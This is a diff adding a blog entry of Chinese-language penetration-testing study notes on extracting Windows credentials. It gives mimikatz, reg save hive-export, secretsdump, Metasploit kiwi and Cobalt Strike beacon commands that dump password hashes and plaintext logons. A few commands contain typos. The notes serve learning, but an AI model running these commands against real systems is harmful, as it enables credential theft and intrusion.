@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>windows密码凭证获取1</title>
+      <link href="2021/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/"/>
+      <url>2021/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/</url>
+      
+        <content type="html"><![CDATA[<p>学习笔记</p><a id="more"></a><h2 id="windows本地认证"><a href="#windows本地认证" class="headerlink" title="windows本地认证"></a>windows本地认证</h2><ol><li>用户输入密码</li><li>系统收到密码后将用户输入的密码计算为NTLM hash</li><li>与sam数据库中该用户的hash进行对比</li><li>相同则登陆成功，不相同则登陆失败</li></ol><p>本地认证中用来处理用户输入密码的进程为lsass.exe密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行对比，我们使用mimikatz来获取的明文密码，便是这个进程中读到的。</p><h2 id="获取凭证的姿势"><a href="#获取凭证的姿势" class="headerlink" title="获取凭证的姿势"></a>获取凭证的姿势</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>privilege::debug  //提升权限<br>inject::process lsass.exe sekurlsa.dll //注入sekurlas.dll到lsass.exe进程里<br>sekurlsa::logonpasswords //获取密码</p><h3 id="powershell脚本"><a href="#powershell脚本" class="headerlink" title="powershell脚本"></a>powershell脚本</h3><p>这种方法的优点是无文件落地.</p><p>powershell远程加载minikatz<br>powershell加载Get-PassHashes脚本</p><h3 id="pwdump7"><a href="#pwdump7" class="headerlink" title="pwdump7"></a>pwdump7</h3><h3 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h3><p>用于解密哈希<br><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p><h3 id="Procdump-mimikatz联合"><a href="#Procdump-mimikatz联合" class="headerlink" title="Procdump + mimikatz联合"></a>Procdump + mimikatz联合</h3><p>使用procdump lsass进程导出，再用miniikatz还原密码 </p><h3 id="注册表导出hash"><a href="#注册表导出hash" class="headerlink" title="注册表导出hash"></a>注册表导出hash</h3><pre class="line-numbers language-none"><code class="language-none">reg save HKLM\SYSTEM system.hivreg save HKLM\SAM sam.hivreg save HKLM\SECURITY security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>导出后可以试用cain导出system.hiv、security.hiv获取缓存中的明文信息。</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;lsadump::sam &#x2F;system:system.hiv &#x2F;sam:sam.hiv&quot; exitpython secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p><h3 id="meterpreter获取Hash"><a href="#meterpreter获取Hash" class="headerlink" title="meterpreter获取Hash"></a>meterpreter获取Hash</h3><pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;hashdump set sesion 1exploiit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Hashdump使用的是mimikatz的部分功能<br>Load mimikatz<br>获取用户密码的hash值<br>wdigest 、kerberos 、msv 、ssp 、tspkg 、livessp<br>mimikatz_command -h<br>mimikatz_command -f :: //查询有哪些模块<br>mimikatz_command -f samdump::hashes //从windows的sam文件中读取密码hash值<br>mimikatz_command -f sekurlsa::searchPasswords //获取明文密码<br>mimikatz_command -f samdump::bootkey</p><p>msf6：</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt;load kiwimeterpreter &gt; help kiwi列举系统中的明文密码meterpreter &gt; creds_all读取sam文件meterpreter &gt; lsa_dump_samkiwi_cmd命令后面接mimikatz.exe的命令meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="cs获取Hash"><a href="#cs获取Hash" class="headerlink" title="cs获取Hash"></a>cs获取Hash</h3><p>主机上线后获取hash</p><pre class="line-numbers language-none"><code class="language-none">beacon&gt; hashdumpbeacon&gt; logonpasswordsbeacon&gt; mimikatz sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>域学习笔记</title>
       <link href="2021/%E5%9F%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
       <url>2021/%E5%9F%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
